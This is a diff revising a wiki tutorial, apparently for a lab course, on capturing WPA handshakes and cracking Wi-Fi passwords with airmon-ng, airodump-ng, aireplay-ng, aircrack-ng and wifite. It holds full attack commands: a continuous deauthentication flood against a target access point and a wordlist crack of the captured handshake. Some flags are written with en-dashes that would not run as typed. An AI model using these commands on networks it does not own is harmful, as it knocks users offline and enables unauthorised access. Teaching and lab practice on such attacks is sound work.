@@ -54,53 +54,63 @@ Nowadays almost all network cards support the monitor mode and  supports both 2.
 
 ## Handshake Capture - Prepare your Wi-Fi adapter
 
+But first open terminal and type
 
-Kill all the adapter processes to run without restriction.
+![](https://gitlab.dclabra.fi/wiki/uploads/upload_ebf956451397e70c9df4bfdda669a2c6.png)
+
+
+And then kill all the adapter processes to run without restriction.
 
 Go to the terminal and execute this command:
 ```
 airmon-ng check kill
 ```
 
-wpa_supplicant was successfully stopped and
+Now wpa_supplicant was successfully stopped
 
-* Switch down wlan0 interface with:ifconfig wlan0 down
-* Turn on the monitor mode with:iwconfig wlan0 mode monitor
-* Switch on wlan0 interface with:ifconfig wlan0 up
+* Switch down wlan0 interface with: ```ifconfig wlan0 down```
+* Turn on the monitor mode with: ```iwconfig wlan0 mode monitor```
+* Switch on wlan0 interface with: ```ifconfig wlan0 up```
 
 ## Scan all the available networks
 
 List down all the surrounding networks with:
 ```
-airodump-ng wlan0
+airodump-ng wlan0mon
 ```
+
+Run ```iwconfig```. 
+
+You should now see a new monitor mode interface listed (likely mon0 or wlan0mon)
+
 ## Capture the handshake
 
 Run this command:
 ```
 airodump-ng –channel {channel id} –bssid {BSSID} 
-–essid {ESSID} -w {output directory of the captured file} wlan0
+–essid {ESSID} -w {output directory of the captured file} wlan0mon
 ```
 
 **EXAMPLE** 
 ```
 airodump-ng –channel 12 –bssid 01:34:5C:56:2D:A5 –essid 
-Tp-Link -w /home/kali/Documents wlan0
+Tp-Link -w /home/kali/Documents wlan0mon
 ```
 ## Deauthenticate clients from target access point
 
 Run this command:
 ```
-aireplay-ng -0 0 -e {ESSID} -a bssid wlan0 –ig
+aireplay-ng -0 0 -e {ESSID} -a bssid wlan0mon –ig
 ````
 
 EXAMPLE 
 ```
-aireplay-ng -0 0 -e Tp-Link -a 01:34:5C:56:2D:A5 wlan0 –ig
+aireplay-ng -0 0 -e Tp-Link -a 01:34:5C:56:2D:A5 wlan0mon –ig
 ````
-Our deauthentication attack is successful because we see the captured handshakes. 
+Now we wait… Once you’ve captured a handshake, you should see something like [ WPA handshake: bc:d3:c9:ef:d2:67 at the top right of the screen, just right of the current time.
+Our deauthentication attack is successful when we see the captured handshakes. 
 
-In this example, 2 clients were reconnected, so 2 handshakes were made. You can now stop listening to the network by pressing CTRL+C.
+You can now stop listening to the network by pressing CTRL+C.
 
 ## Run a wordlist attack
 
@@ -113,8 +123,22 @@ aircrack-ng -w {wordlist-location} {output-file}
 ```
 
 EXAMPLE 
+
+```pwd```
+
+![](https://gitlab.dclabra.fi/wiki/uploads/upload_cf2475791c1cbd332d7c38352fc7b8d5.png)
+
+```touch salasanat.txt```
+
+```nano salasanat.txt```
+
+![](https://gitlab.dclabra.fi/wiki/uploads/upload_e19005ed77bddc7c83da9591bbb61bc5.png)
+
+And the next one commad....
+
+
 ````
-aircrack-ng -w /usr/share/seclists/Password/WiFi-WPA/top62.txt /home/kali/01.pcap
+aircrack-ng -w /home/kali/salasanat.txt /home/kali/01.pcap
 ````
 
 It will now take time for your computer to process all the words from your wordlist. Once the password is found, you will see it next to the “**KEY FOUND**”.
@@ -163,7 +187,7 @@ Put your interface into monitor mode using 'airmon-ng start {wireless interface}
 ![](https://gitlab.dclabra.fi/wiki/uploads/upload_4a52f4e1043c17ad048a225451938bfc.png)
 
 
-Run wifite2 with the sudo command and the kill flag. This will enable the monitoring mode and show you the list of available networks.
+Run wifite with the sudo command and the  --kill flag. This will enable the monitoring mode and show you the list of available networks.
 
 
 Check out the networks with WPS = yes. These are your potential targets.
